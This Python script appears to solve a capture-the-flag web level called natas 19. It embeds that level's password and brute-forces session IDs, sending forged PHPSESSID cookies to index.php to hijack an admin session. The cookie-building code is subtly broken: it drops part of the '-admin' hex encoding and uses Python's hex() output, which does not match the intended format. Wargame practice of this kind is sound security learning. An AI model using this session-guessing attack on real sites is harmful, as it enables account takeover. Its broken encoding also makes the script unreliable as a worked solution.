import natasX

natas = natasX

#print(natas.natasX(19, "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs", endpoint="index.php", data={"debug": "", "username": "admin", "password": "123"}).cookies.get("PHPSESSID"))

for i in range(640, 1200):
    print(f'{str(i).encode("utf-8").hex()}d61646d696e')
    print(natas.natasX(19, "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs", endpoint="index.php",
                       data={"debug": "", "username": "admin", "password": ""}, cookies={"PHPSESSID": f'{hex(i)}d61646d696e'}).text)